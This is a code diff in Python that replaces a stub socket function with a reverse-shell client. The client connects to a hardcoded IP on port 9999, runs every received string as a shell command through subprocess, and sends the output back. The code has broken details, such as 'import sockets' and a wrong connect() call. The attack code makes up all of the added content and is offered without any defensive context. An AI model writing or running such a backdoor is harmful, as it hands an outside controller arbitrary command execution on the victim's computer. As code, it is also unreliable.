@@ -1,15 +1,22 @@
 import sockets
-import sys
+import os
+import subprocess
 
-# create a socket ( connect to computers )
-def create_socket():
-    try:
-        global host
-        global port
-        global s
+s = socket.socket()
+host = '198.168.0.105'
+port = 9999
 
-        host = ""
-        port = 9999
-    
-    except socket.error as msg:
-        print("socket creation error: " + str(msg))
+s.connect(host, port)
+
+while True:
+    data = s.recv(1024)
+    if data[:2].decode("utf-8") == 'cd':
+        os.chdir(data[3:].decode("utf-8"))
+    if len(data) > 0:
+        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+        output_byte = cmd.stdout.read() + cmd.stderr.read()
+        output_str = str(output_byte, "utf-8")
+        currentWD = os.getcwd() + "> "
+        s.send(str.encode(output_str))
+
+        print(output_str)
